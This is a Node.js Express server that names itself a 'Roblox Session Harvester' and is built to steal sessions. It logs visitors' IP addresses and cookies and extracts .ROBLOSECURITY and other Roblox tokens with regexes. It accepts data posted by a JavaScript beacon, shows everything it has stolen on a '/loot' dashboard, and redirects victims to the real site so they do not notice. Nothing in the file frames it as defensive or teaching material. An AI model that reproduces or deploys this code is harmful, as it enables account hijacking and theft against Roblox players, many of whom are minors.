const express = require('express');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());

let stolenSessions = [];

// Main capture endpoint - captures referer data then redirects
app.get('/capture', (req, res) => {
    const target = req.query.redirect || 'https://roblox.com';
    
    const harvest = {
        timestamp: new Date().toISOString(),
        ip: req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress,
        userAgent: req.headers['user-agent'],
        referer: req.headers['referer'],
        cookies: req.headers['cookie'] || 'None',
        target: target,
        // Try to extract specific Roblox tokens if present
        robloxSpecific: {
            auth: req.headers['cookie']?.match(/\.ROBLOSECURITY=([^;]+)/)?.[1] || 'HttpOnly (inaccessible)',
            guest: req.headers['cookie']?.match(/GuestData=([^;]+)/)?.[1] || null,
            session: req.headers['cookie']?.match(/SessionTracker=([^;]+)/)?.[1] || null
        }
    };
    
    stolenSessions.push(harvest);
    console.log('[+] Roblox Harvest:', harvest.ip, '| Auth present:', !!harvest.robloxSpecific.auth);
    
    // Redirect to real site to avoid suspicion
    res.redirect(target);
});

// Beacon endpoint for JavaScript-based collection
app.post('/beacon', (req, res) => {
    const data = {
        timestamp: new Date().toISOString(),
        ip: req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress,
        payload: req.body,
        headers: req.headers
    };
    
    stolenSessions.push(data);
    console.log('[+] Beacon received from:', data.ip);
    res.sendStatus(200);
});

// Dashboard to view captured sessions
app.get('/loot', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Roblox Harvester</title>
        <style>
            body { background: #0a0a0a; color: #00ff00; font-family: monospace; padding: 20px; }
            .session { border: 1px solid #333; margin: 10px 0; padding: 15px; background: #111; }
            .token { color: #ff0000; background: #300; padding: 2px 5px; word-break: break-all; }
            .ip { color: #00ffff; }
            .header { color: #ffff00; }
        </style>
    </head>
    <body>
        <h1>🎮 Roblox Session Harvester</h1>
        <h3>Active Sessions: ${stolenSessions.length}</h3>
        
        ${stolenSessions.map((s, i) => `
        <div class="session">
            <div class="header">#${i + 1} | ${s.timestamp} | IP: <span class="ip">${s.ip}</span></div>
            <div>User-Agent: ${s.userAgent?.substring(0, 100)}...</div>
            ${s.robloxSpecific ? `
            <div>Roblox Auth Token: <span class="token">${s.robloxSpecific.auth}</span></div>
            <div>Guest Data: ${s.robloxSpecific.guest || 'None'}</div>
            ` : ''}
            <div>Raw Cookies: ${s.cookies}</div>
            ${s.payload ? `<div>JS Payload: ${JSON.stringify(s.payload)}</div>` : ''}
        </div>
        `).join('')}
    </body>
    </html>
    `);
});

// Keep-alive endpoint for pixel tracking
app.get('/pixel.gif', (req, res) => {
    console.log('[+] Pixel loaded by:', req.headers['x-forwarded-for'] || req.socket.remoteAddress);
    res.setHeader('Content-Type', 'image/gif');
    res.send(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
});

app.listen(process.env.PORT || 3000, () => {
    console.log('Roblox Harvester active on port', process.env.PORT || 3000);
});
